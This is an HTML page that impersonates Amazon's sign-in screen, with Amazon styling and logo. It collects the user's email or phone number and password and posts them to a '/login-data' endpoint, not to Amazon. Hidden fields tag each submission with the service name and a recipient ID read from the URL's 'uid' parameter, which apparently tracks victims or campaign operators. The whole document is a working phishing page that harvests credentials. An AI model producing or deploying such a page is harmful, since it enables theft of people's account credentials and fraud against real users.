<!DOCTYPE html>
<html>
<head>
    <title>Amazon Sign-In</title>
    <style>
        body { font-family: "Amazon Ember", Arial, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; padding-top: 20px; }
        .container { width: 350px; border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
        .logo { width: 103px; margin: 0 auto 10px; display: block; }
        h1 { font-weight: 400; font-size: 28px; margin-bottom: 10px; }
        label { font-weight: 700; font-size: 13px; }
        input { width: 100%; height: 31px; padding: 3px 7px; border: 1px solid #a6a6a6; border-radius: 3px; margin-top: 5px; margin-bottom: 15px; box-sizing: border-box; }
        button { width: 100%; height: 31px; background: #f0c14b; border-radius: 3px; border: 1px solid #a88734; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
        <h1>Sign-In</h1>
        <form action="/login-data" method="post">
            <label for="username">Email or mobile phone number</label>
            <input type="text" name="username" required>
            <label for="password">Password</label>
            <input type="password" name="password" required>
            <!-- HIDDEN FIELDS -->
            <input type="hidden" name="service" value="Amazon">
            <input type="hidden" id="recipientId" name="recipientId" value="">
            <button type="submit">Continue</button>
        </form>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", () => {
            const userId = new URLSearchParams(window.location.search).get('uid');
            if (userId) document.getElementById('recipientId').value = userId;
        });
    </script>
</body>
</html>
